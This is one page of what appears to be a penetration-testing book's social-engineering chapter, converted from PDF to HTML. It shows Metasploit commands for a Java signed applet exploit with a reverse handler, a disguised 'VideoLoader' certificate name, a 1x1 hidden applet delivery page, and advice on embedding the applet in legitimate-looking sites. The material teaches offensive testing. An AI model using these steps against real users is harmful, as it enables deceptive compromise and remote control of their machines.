<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pfde" class="pf w2 h2" data-page-no="de"><div class="pc pcde w2 h2"><div class="t m0 x6 h10 y83 ff2 fs2 fc0 sc0 ls8 ws0">Chapter 6: Spear Social Engineering<span class="_ _9"> </span><span class="ff1 fs9 lsa">199</span></div><div class="t m0 x4 hd y11c ff4 fs7 fc0 sc0 ls0 ws0">In the follo<span class="_ _0"/>wing example, you can see we start by redening the name of the Ja<span class="_ _0"/>v<span class="_ _0"/>a </div><div class="t m0 x3 hd y11d ff4 fs7 fc0 sc0 ls0 ws0">app to “V<span class="_ _2"/>ideoLoader” and change the value that will be displayed in the certicate </div><div class="t m0 x3 hd y11e ff4 fs7 fc0 sc0 ls0 ws0">warning. <span class="_ _0"/>W<span class="_ _3"/>e’<span class="_ _0"/>d obviously w<span class="_ _0"/>ant to choose a name for the app and the certicate that </div><div class="t m0 x3 hd y15c ff4 fs7 fc0 sc0 ls0 ws0">is in line with our story<span class="_ _2"/>. W<span class="_ _3"/>e then set the server to listen on port 80 and change the </div><div class="t m0 x3 hd y15d ff4 fs7 fc0 sc0 ls0 ws0">URIP<span class="_ _3"/>A<span class="_ _3"/>TH just as in the pre<span class="_ _0"/>vious exploit.</div><div class="t m0 x3 h44 y1539 fff fse fc0 sc0 ls0 ws0">msf exploit(java_signed_applet) &gt; set APPLETNAME VideoLoader</div><div class="t m0 x3 h44 y153a fff fse fc0 sc0 ls0 ws0">APPLETNAME =&gt; VideoLoader</div><div class="t m0 x3 h44 y153b fff fse fc0 sc0 ls0 ws0">msf exploit(java_signed_applet) &gt; set CERTCN VideoLoader</div><div class="t m0 x3 h44 y153c fff fse fc0 sc0 ls0 ws0">CERTCN =&gt; VideoLoader</div><div class="t m0 x3 h44 y153d fff fse fc0 sc0 ls0 ws0">msf exploit(java_signed_applet) &gt; set SRVPORT 80</div><div class="t m0 x3 h44 y153e fff fse fc0 sc0 ls0 ws0">SRVPORT =&gt; 80</div><div class="t m0 x3 h44 y153f fff fse fc0 sc0 ls0 ws0">msf exploit(java_signed_applet) &gt; set URIPATH /</div><div class="t m0 x3 h44 y1540 fff fse fc0 sc0 ls0 ws0">URIPATH =&gt; /&gt; </div><div class="t m0 x3 h44 y1541 fff fse fc0 sc0 ls0 ws0">msf exploit(java_signed_applet) &gt; exploit</div><div class="t m0 x3 h44 y1542 fff fse fc0 sc0 ls0 ws0">[*] Exploit running as background job.</div><div class="t m0 x3 h44 y1543 fff fse fc0 sc0 ls0 ws0">[*] Started reverse handler on 192.168.1.25:4444 </div><div class="t m0 x3 h44 y1544 fff fse fc0 sc0 ls0 ws0">[*] Using URL: http://192.168.1.25:80/</div><div class="t m0 x3 h44 y1545 fff fse fc0 sc0 ls0 ws0">[*] Server started.</div><div class="t m0 x3 h44 y1546 fff fse fc0 sc0 ls0 ws0">msf exploit(java_signed_applet) &gt; </div><div class="t m0 x4 hd y1547 ff4 fs7 fc0 sc0 ls0 ws0">The entire source code of the page provided to the user that deli<span class="_ _0"/>v<span class="_ _0"/>ers the Jav<span class="_ _0"/>a </div><div class="t m0 x3 hd y1548 ff4 fs7 fc0 sc0 ls0 ws0">signed applet is in the follo<span class="_ _0"/>wing example. <span class="_ _3"/>Y<span class="_ _1b"/>ou’ll notice there is very little to it—in </div><div class="t m0 x3 hd y1549 ff4 fs7 fc0 sc0 ls0 ws0">fact, there’<span class="_ _2"/>s no real content, just another blank page.</div><div class="t m0 x3 h44 y154a fff fse fc0 sc0 ls0 ws0">&lt;html&gt;&lt;head&gt;&lt;title&gt;Loading, Please Wait...&lt;/title&gt;&lt;/head&gt;</div><div class="t m0 x3 h44 y154b fff fse fc0 sc0 ls0 ws0">&lt;body&gt;&lt;center&gt;&lt;p&gt;Loading, Please Wait...&lt;/p&gt;&lt;/center&gt;</div><div class="t m0 x3 h44 y154c fff fse fc0 sc0 ls0 ws0">&lt;applet archive="/VideoLoader.jar"</div><div class="t m0 x3 h44 y154d fff fse fc0 sc0 ls0 ws0">  code="VideoLoader" width="1" height="1"&gt;</div><div class="t m0 x3 h44 y154e fff fse fc0 sc0 ls0 ws0">&lt;/applet&gt;</div><div class="t m0 x3 h44 y154f fff fse fc0 sc0 ls0 ws0">&lt;/body&gt;&lt;/html&gt;</div><div class="t m0 x4 hd y1550 ff4 fs7 fc0 sc0 ls0 ws0">Rather than sending the user to a simple blank page, we can make our attack e<span class="_ _0"/>ven </div><div class="t m0 x3 hd y1551 ff4 fs7 fc0 sc0 ls0 ws0">more ef<span class="_ _0"/>fectiv<span class="_ _0"/>e by embedding these exploits into a more le<span class="_ _0"/>gitimate-looking web </div><div class="t m0 x3 hd y1552 ff4 fs7 fc0 sc0 ls0 ws0">page. T<span class="_ _3"/>o embed the Jav<span class="_ _0"/>a signed applet into another web page, we add the applet </div><div class="t m0 x3 hd y1553 ff4 fs7 fc0 sc0 ls0 ws0">source code to our page. The nice thing about doing it this w<span class="_ _0"/>ay is you can run the </div><div class="t m0 x3 hd y1554 ff4 fs7 fc0 sc0 ls0 ws0">Jav<span class="_ _0"/>a-deli<span class="_ _0"/>v<span class="_ _0"/>ering web server on a separate web server from the site serving the web </div><div class="t m0 x3 hd y1555 ff4 fs7 fc0 sc0 ls0 ws0">page if you choose. <span class="_ _3"/>Y<span class="_ _3"/>ou’ll just ha<span class="_ _0"/>ve to adjust the archi<span class="_ _0"/>ve location to be a full URL, </div><div class="t m0 x3 hd y1556 ff4 fs7 fc0 sc0 ls0 ws0">as in the follo<span class="_ _0"/>wing example:</div><div class="t m0 x3 h44 y1557 fff fse fc0 sc0 ls0 ws0">&lt;applet archive="http://192.168.1.25/VideoLoader.jar"</div><div class="t m0 x3 h44 y1558 fff fse fc0 sc0 ls0 ws0">  code="VideoLoader" width="1" height="1"&gt;</div><div class="t m0 x3 h44 y1559 fff fse fc0 sc0 ls0 ws0">&lt;/applet&gt;</div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>